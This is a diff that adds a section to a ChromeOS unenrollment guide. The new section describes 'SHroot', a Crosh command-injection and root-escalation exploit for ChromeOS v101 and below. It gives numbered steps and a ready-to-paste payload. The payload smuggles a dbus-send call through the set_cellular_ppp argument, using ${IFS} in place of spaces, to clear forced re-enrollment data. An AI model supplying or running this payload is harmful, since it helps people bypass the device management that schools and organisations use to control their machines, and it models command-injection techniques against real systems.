@@ -49,3 +49,13 @@ In the event of a kernskip, you should downgrade to the versions connected to yo
 
 # How do I unenroll?
 ## ChromeOS v101 and below - SHroot
+Pretty cool universal USB-less unenrollment exploit that requires you to have a Chromebook that hasn't been touched in years. It exploits a bash shell and root escalation method in Crosh that has been long patched, but still very neat and very easy.
+
+1. Login to your Chromebook.
+2. Open Crosh with `ctrl+alt+t`. If it says `crosh is blocked`, use SH1mmer.
+3. Paste the following in:
+
+`set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`
+
+Just like this \
+<img src="https://github.com/kkilobyte/ditch-cros/blob/main/img/tutorial/crosh-rootesc.png?raw=true" alt="crosh-rootesc.png"/><img width="1217" height="216" alt="image" src="https://github.com/user-attachments/assets/ce4c9154-2aad-43a2-85f2-8aa0ae711267" />
